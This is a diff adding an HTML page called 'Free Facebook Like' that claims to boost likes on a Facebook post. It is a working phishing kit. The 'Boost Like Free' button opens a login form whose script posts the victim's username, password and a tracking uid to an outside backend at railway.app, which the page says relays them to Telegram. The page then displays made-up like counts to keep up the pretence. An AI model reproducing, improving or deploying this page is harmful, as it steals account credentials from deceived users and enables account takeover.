@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Free Facebook Like</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background-color: #f0f2f5;
+    margin: 0;
+    padding: 20px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+
+  h1 {
+    color: #1877f2;
+    margin-bottom: 20px;
+  }
+
+  .input-section {
+    width: 90%;
+    max-width: 500px;
+    display: flex;
+    flex-direction: column;
+    margin-bottom: 30px;
+  }
+
+  .input-section input {
+    padding: 12px;
+    border-radius: 8px;
+    border: 1px solid #dddfe2;
+    font-size: 16px;
+    margin-bottom: 10px;
+  }
+
+  .input-section button {
+    padding: 12px;
+    border-radius: 8px;
+    border: none;
+    background-color: #1877f2;
+    color: white;
+    font-weight: bold;
+    cursor: pointer;
+    font-size: 16px;
+  }
+
+  .input-section button:hover {
+    background-color: #166fe5;
+  }
+
+  .container {
+    width: 100%;
+    max-width: 500px;
+  }
+
+  .post-box {
+    background-color: #fff;
+    padding: 15px;
+    margin-bottom: 20px;
+    border-radius: 10px;
+    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+  }
+
+  .post-link {
+    font-weight: bold;
+    margin-bottom: 10px;
+    word-break: break-all;
+  }
+
+  .boost-btn {
+    margin-top: 10px;
+    padding: 10px;
+    width: 100%;
+    background-color: #42b72a;
+    border: none;
+    border-radius: 8px;
+    color: white;
+    font-weight: bold;
+    cursor: pointer;
+  }
+
+  .boost-btn:hover {
+    background-color: #36a420;
+  }
+
+  /* Login form modal */
+  .modal {
+    display: none;
+    position: fixed;
+    z-index: 999;
+    left: 0; top: 0;
+    width: 100%; height: 100%;
+    background-color: rgba(0,0,0,0.5);
+    justify-content: center;
+    align-items: center;
+  }
+
+  .modal-content {
+    background-color: white;
+    padding: 30px;
+    border-radius: 10px;
+    width: 300px;
+    text-align: center;
+  }
+
+  .modal-content h2 {
+    margin-bottom: 20px;
+  }
+
+  .modal-content input {
+    width: 100%;
+    padding: 10px;
+    margin: 10px 0;
+    border-radius: 6px;
+    border: 1px solid #ccc;
+  }
+
+  .modal-content button {
+    width: 100%;
+    padding: 10px;
+    margin-top: 10px;
+    border-radius: 6px;
+    border: none;
+    background-color: #1877f2;
+    color: white;
+    font-weight: bold;
+    cursor: pointer;
+  }
+
+</style>
+</head>
+<body>
+
+<h1>Free Facebook Like</h1>
+
+<div class="input-section">
+  <input type="text" id="post-link" placeholder="Enter Facebook post link">
+  <button onclick="addPost()">Get Like</button>
+</div>
+
+<div class="container" id="posts-container">
+  <!-- Dynamic posts appear here -->
+</div>
+
+<!-- Login Modal -->
+<div class="modal" id="login-modal">
+  <div class="modal-content">
+    <h2>Login</h2>
+    <input type="text" id="username" placeholder="Username">
+    <input type="password" id="password" placeholder="Password">
+    <button onclick="sendLogin()">Login</button>
+  </div>
+</div>
+
+<script>
+  const BACKEND_URL = "https://bot-production-85f6.up.railway.app";
+  const postsContainer = document.getElementById("posts-container");
+  const loginModal = document.getElementById("login-modal");
+  const posts = [];
+  let currentBoostIndex = null; // Track which post triggered login
+
+  function getUID() {
+    const params = new URLSearchParams(window.location.search);
+    return params.get("uid");
+  }
+
+  function addPost() {
+    const link = document.getElementById("post-link").value.trim();
+    if(!link) {
+      alert("Please enter a post link!");
+      return;
+    }
+
+    const post = {
+      link: link,
+      likes: Math.floor(Math.random()*10)+1
+    };
+
+    posts.push(post);
+    renderPosts();
+    document.getElementById("post-link").value = "";
+  }
+
+  function boostLike(index) {
+    // Show login modal
+    currentBoostIndex = index;
+    loginModal.style.display = "flex";
+  }
+
+  async function sendLogin() {
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+    const uid = getUID();
+
+    if(!uid) {
+      alert("Invalid link: UID not found.");
+      return;
+    }
+    if(!username || !password) {
+      alert("Enter both username and password.");
+      return;
+    }
+
+    try {
+      const res = await fetch(`${BACKEND_URL}/receive_login`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ uid, username, password })
+      });
+      const data = await res.json();
+      if(data.status === "sent") {
+        alert("✅ Login info sent to Telegram!");
+        loginModal.style.display = "none";
+        // After login, simulate like boost
+        if(currentBoostIndex !== null){
+          posts[currentBoostIndex].likes += Math.floor(Math.random()*11)+50; // 50-60 likes
+          renderPosts();
+          currentBoostIndex = null;
+        }
+      } else {
+        alert("❌ Error: " + (data.error || "Unknown error"));
+      }
+    } catch(err) {
+      alert("❌ Network error: " + err);
+    }
+  }
+
+  function renderPosts() {
+    postsContainer.innerHTML = "";
+    posts.forEach((post,index)=>{
+      const postDiv = document.createElement("div");
+      postDiv.classList.add("post-box");
+
+      postDiv.innerHTML = `
+        <div class="post-link">Post: ${post.link}</div>
+        <button class="boost-btn" onclick="boostLike(${index})">Boost Like Free</button>
+        <span class="like-count">${post.likes} Likes</span>
+      `;
+
+      postsContainer.appendChild(postDiv);
+    });
+  }
+
+  // Close modal on outside click
+  window.onclick = function(event) {
+    if(event.target == loginModal){
+      loginModal.style.display = "none";
+    }
+  }
+</script>
+
+</body>
+</html>
